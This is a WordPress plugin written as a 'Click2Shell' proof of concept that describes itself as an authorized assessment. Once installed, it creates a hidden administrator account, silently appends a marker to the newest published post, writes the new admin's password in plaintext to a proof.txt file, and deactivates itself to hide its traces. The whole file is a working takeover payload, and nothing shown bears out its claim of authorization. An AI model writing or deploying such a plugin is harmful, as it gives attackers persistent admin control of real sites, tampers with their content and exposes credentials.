<?php
/**
 * Plugin Name: Security Audit PoC (Click2Shell chain)
 * Description: Authorized security assessment - creates an admin account and marks a post to demonstrate the Click2Shell chain. Self-cleans.
 * Version: 1.0.0
 * Author: Authorized Assessment
 */

if (!defined('ABSPATH')) { exit; }

$results = array();

// 1) Create an administrator account (goal #1: admin-level access)
$login = 'audit_admin';
$pass  = 'AuditP0c-' . wp_generate_password(10, false);
if (!username_exists($login)) {
    $uid = wp_create_user($login, $pass, 'audit_admin@irangate.news.invalid');
    $u = new WP_User($uid);
    $u->set_role('administrator');
    $results[] = "ADMIN CREATED: user=$login pass=$pass uid=$uid";
} else {
    $results[] = "admin user already exists: $login";
}

// 2) Edit the latest published post with a canary (goal #2: edit a post)
$latest = get_posts(array('numberposts' => 1, 'post_status' => 'publish'));
if (!empty($latest)) {
    $p = $latest[0];
    $marker = "\n\n<!-- click2shell-poc: edited by authorized assessment " . gmdate('c') . " -->";
    if (strpos($p->post_content, 'click2shell-poc') === false) {
        wp_update_post(array('ID' => $p->ID, 'post_content' => $p->post_content . $marker));
        $results[] = "POST EDITED: id={$p->ID} title={$p->post_title}";
    } else {
        $results[] = "post {$p->ID} already marked";
    }
}

// 3) Write proof (in plugin dir, not webroot) and self-deactivate+delete
$proof = implode("\n", $results) . "\n";
file_put_contents(__DIR__ . '/proof.txt', $proof);

// self-clean: deactivate and remove this plugin
if (function_exists('deactivate_plugins')) {
    deactivate_plugins(plugin_basename(__FILE__));
}
